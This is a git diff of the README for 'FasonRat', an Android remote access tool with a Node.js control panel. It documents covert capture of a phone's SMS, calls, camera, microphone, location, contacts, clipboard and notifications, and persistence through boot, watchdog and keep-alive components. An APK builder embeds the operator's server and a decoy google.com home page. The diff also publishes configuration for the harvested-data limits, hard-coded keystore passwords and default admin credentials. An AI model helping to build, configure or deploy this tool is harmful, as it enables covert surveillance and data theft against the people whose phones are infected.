@@ -1,7 +1,7 @@
-# Fason
+# FasonRat
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-2.2.2-purple?style=flat-square" alt="Version 2.2.2">
+  <img src="https://img.shields.io/badge/Version-2.3.0-purple?style=flat-square" alt="Version 2.3.0">
   <img src="https://img.shields.io/badge/Android-14+-green?style=flat-square&logo=android" alt="Android 14+">
   <img src="https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=node.js" alt="Node.js 18+">
   <img src="https://img.shields.io/badge/Java-17-orange?style=flat-square&logo=openjdk" alt="Java 17">
@@ -47,23 +47,30 @@
 ### 🛠️ Tools
 - **APK Builder** - Build custom APK with your server configuration
 - **Log Manager** - Track all system activity and events
+- **User Management** - Register, login, logout with session management
+
+### 🔐 Security
+- **Session-based Auth** - Secure token-based authentication
+- **Rate Limiting** - Protection against brute force attacks
+- **Login Lockout** - Temporary lockout after failed attempts
+- **Signed APK** - Release builds signed with keystore
 
 ---
 
 <details>
 <summary>🖥️ Screenshots</summary>
 
-| Login | Dashboard |
-|:-----:|:---------:|
-| <img src="assets/login.png" width="400"> | <img src="assets/dashboard.png" width="400"> |
+| Login | Register |
+|:-----:|:--------:|
+| <img src="assets/login.png" width="400"> | <img src="assets/register.png" width="400"> |
 
-| Control Panel | APK Builder |
-|:-------------:|:-----------:|
-| <img src="assets/control_panel.png" width="400"> | <img src="assets/builder.png" width="400"> |
+| Dashboard | Control Panel |
+|:---------:|:-------------:|
+| <img src="assets/dashboard.png" width="400"> | <img src="assets/control_panel.png" width="400"> |
 
-| Activity Logs |
-|:-------------:|
-| <img src="assets/logs.png" width="400"> |
+| APK Builder | Activity Logs |
+|:-----------:|:-------------:|
+| <img src="assets/builder.png" width="400"> | <img src="assets/logs.png" width="400"> |
 
 </details>
 
@@ -93,44 +100,132 @@ npm start
 
 Access control panel at `http://localhost:22533`
 
-> 🔐 **Default Credentials:** `admin` / `fason`
+> 🔐 **Default Credentials:** Username: `admin` / Password: `fason`
 
 ### Build APK
 
 **Option A: Web Builder (Recommended)**
 1. Open control panel → **Builder**
 2. Enter server URL → Click **Build APK**
-3. Download signed APK
+3. Download signed APK (`Fason.apk`)
 
 **Option B: Gradle**
 ```bash
 cd fason
-./gradlew assembleDebug      # Debug build
-./gradlew assembleRelease    # Release build
+
+# Debug build
+./gradlew assembleDebug
+
+# Release build (signed with release.keystore)
+./gradlew assembleRelease
 ```
+
+The release APK is signed with the included `release.keystore`:
+- **Alias:** `Fason-key-alias`
+- **Password:** `Fahim-Ahamed@Fason`
 
 </details>
 
 <details>
 <summary>⚙️ Configuration</summary>
 
-### Server (`server/core/config.js`)
+### Server (`server/core/config/config.js`)
 ```javascript
 module.exports = {
     port: 22533,
     debug: false,
+
+    // Feature limits
     limits: {
         maxClients: 500,
+        maxDownloads: 100,
+        maxPhotos: 100,
+        maxGpsHistory: 100,
+        maxSmsHistory: 250,
+        maxCallsHistory: 250,
+        maxNotifications: 200,
+        maxClipboardHistory: 200,
         maxFileSize: 50 * 1024 * 1024  // 50MB
+    },
+
+    // Socket.IO config
+    socket: {
+        pingInterval: 25000,
+        pingTimeout: 60000,
+        maxHttpBufferSize: 50e6
+    },
+
+    // Rate limiting
+    rateLimit: {
+        windowMs: 60000,    // 1 minute
+        maxRequests: 100
+    },
+
+    // Security
+    security: {
+        sessionTimeout: 24 * 60 * 60 * 1000,  // 24 hours
+        loginAttempts: 5,
+        loginLockout: 15 * 60 * 1000          // 15 minutes
+    },
+
+    // Message keys (matching Android app)
+    msg: {
+        camera: '0xCA',
+        files: '0xFI',
+        calls: '0xCL',
+        sms: '0xSM',
+        mic: '0xMI',
+        location: '0xLO',
+        contacts: '0xCO',
+        wifi: '0xWI',
+        notification: '0xNO',
+        clipboard: '0xCB',
+        apps: '0xIN',
+        permissions: '0xPM',
+        checkPerm: '0xGP'
     }
 };
 ```
 
-### Android (`fason/app/.../Config.java`)
+### Android (`fason/app/src/main/java/com/fason/app/core/config/Config.java`)
 ```java
 public class Config {
     public static final String SERVER_HOST = "http://YOUR_SERVER_IP:22533";
     public static final String HOME_PAGE_URL = "https://google.com";
+}
+```
+
+### Build Config (`fason/app/build.gradle`)
+```gradle
+android {
+    namespace 'com.fason.app'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId 'com.fason.app'
+        minSdk 24
+        targetSdk 34
+        versionCode 7
+        versionName "2.3.0"
+    }
+
+    signingConfigs {
+        release {
+            keyAlias 'Fason-key-alias'
+            keyPassword 'Fahim-Ahamed@Fason'
+            storeFile file('release.keystore')
+            storePassword 'Fahim-Ahamed@Fason'
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
 }
 ```
 
@@ -143,6 +238,12 @@ public class Config {
 - View all connected devices with online/offline status
 - See device info: model, Android version, IP location
 - Click on a device to access control panel
+
+### User Management
+- **Register** - Create new user account
+- **Login** - Authenticate with username/password
+- **Logout** - End session securely
+- Sessions expire after 24 hours of inactivity
 
 ### Device Control Panel
 
@@ -189,10 +290,13 @@ public class Config {
 
 | Component | Purpose |
 |-----------|---------|
+| `FasonApp` | Application class, initializes components |
 | `MainService` | Foreground service, keeps connection alive |
 | `SocketClient` | Socket.IO with auto-reconnect |
+| `SocketCommandRouter` | Routes socket events to feature managers |
 | `BootReceiver` | Auto-start on device boot |
 | `WatchdogReceiver` | Restart service if killed |
+| `KeepAliveWorker` | WorkManager for periodic health checks |
 | `Feature Managers` | Camera, Mic, GPS, SMS, etc. |
 
 ### Server Components
@@ -201,8 +305,10 @@ public class Config {
 |-----------|---------|
 | `Express Server` | Web interface and API |
 | `Socket.IO Server` | Real-time communication |
+| `Auth Module` | Login, register, session management |
 | `LowDB` | JSON data storage |
 | `APK Builder` | Modify and sign APKs |
+| `Task Manager` | Background maintenance tasks |
 
 </details>
 
@@ -217,18 +323,35 @@ FasonRat/
 ├── package.json                  # Dependencies
 │
 ├── fason/                        # Android Application
+│   ├── release.keystore          # Release signing keystore
+│   ├── keystore.properties       # Keystore config (optional)
 │   └── app/src/main/
 │       ├── java/com/fason/app/
 │       │   ├── core/             # App, Config, Socket, Permissions
 │       │   ├── features/         # Camera, Mic, SMS, GPS, etc.
 │       │   ├── service/          # MainService
-│       │   └── receiver/         # Boot & Watchdog receivers
-│       └── AndroidManifest.xml
+│       │   ├── receiver/         # Boot & Watchdog receivers
+│       │   ├── notifications/    # Notification listener
+│       │   ├── ui/               # MainActivity
+│       │   └── worker/           # KeepAliveWorker
+│       └── res/                  # Resources (XML icons)
 │
 ├── server/                       # Control Panel Server
-│   ├── core/                     # Routes, Socket, Builder, Logs
-│   ├── web/                      # EJS templates, CSS, JS
-│   ├── database/                 # JSON database
+│   ├── init.js                   # Server initialization
+│   ├── core/
+│   │   ├── auth/                 # Authentication module
+│   │   ├── config/               # Server configuration
+│   │   ├── routes/               # Express routes
+│   │   ├── socket/               # Socket.IO handlers
+│   │   ├── clients/              # Client management
+│   │   ├── builder/              # APK builder
+│   │   ├── database/             # LowDB setup
+│   │   ├── logs/                 # Logging system
+│   │   └── utils/                # Utilities & tasks
+│   ├── web/
+│   │   ├── views/                # EJS templates
+│   │   └── public/               # CSS, JS
+│   ├── database/                 # JSON database files
 │   └── app/factory/              # APK build tools
 │
 └── assets/                       # Documentation images
@@ -274,6 +397,7 @@ FasonRat/
 | UI | Material Design 3 |
 | Camera | CameraX 1.3.3 |
 | Location | Play Services 21.2.0 |
+| WorkManager | 2.9.0 |
 
 ### Server
 | Technology | Version |
@@ -283,6 +407,7 @@ FasonRat/
 | Real-time | Socket.IO 4.8 |
 | Database | LowDB 1.0 |
 | Templates | EJS 3.1 |
+| Auth | Cookie-based sessions |
 
 </details>
 
@@ -318,7 +443,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Fahim Ahamed**
 
-[![GitHub](https://img.shields.io/badge/GitHub-fahimahamed1-181717?style=flat-square&logo=github)](https://github.com/fahimahamed1) 
+[![GitHub](https://img.shields.io/badge/GitHub-fahimahamed1-181717?style=flat-square&logo=github)](https://github.com/fahimahamed1)
 
 ---
 
